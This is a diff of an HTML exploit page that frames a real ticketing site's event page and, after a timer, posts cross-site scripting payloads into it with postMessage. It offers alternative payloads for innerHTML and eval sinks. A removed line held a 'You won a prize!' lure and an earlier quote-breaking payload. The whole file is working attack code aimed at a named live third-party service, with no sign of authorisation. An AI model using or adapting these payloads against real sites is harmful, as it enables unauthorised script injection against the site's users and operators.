@@ -1,20 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>You won a prize!</h1>
-    <iframe id="targetApp" src="https://www.district.in/events/ye-live-in-india-2026-buy-tickets"></iframe>
+    <h1>Exploit Frame:</h1>
+    <iframe id="targetApp" src="https://www.district.in/events/ye-live-in-india-2026-buy-tickets" width="800" height="600"></iframe>
     
     <script>
-        // Wait for the iframe to load, then fire the payload
         setTimeout(function() {
-          var targetFrame = document.getElementById('targetApp').contentWindow;
+            var targetFrame = document.getElementById('targetApp').contentWindow;
             
-            // Hardcoded diagnostic payload. If this pops, it will literally tell you where it executed.
-            var payload = "'-alert(\"Execution Context: \" + window.origin)-'";
+            // CHOOSE YOUR PAYLOAD BASED ON THE SINK:
             
-            console.log("Sending payload to iframe...");
+            // If the target puts your message into innerHTML:
+            var payload = "<img src=x onerror=alert(document.domain)>";
+            
+            // OR if the target puts your message into eval() or setTimeout():
+            // var payload = "alert(document.domain)";
+            
+            console.log("Sending payload to iframe: " + payload);
+            
+            // Send it as a pure string
             targetFrame.postMessage(payload, '*');
-        }, 25000);
+            
+        }, 10000); // 10 seconds is usually plenty
     </script>
 </body>
 </html>
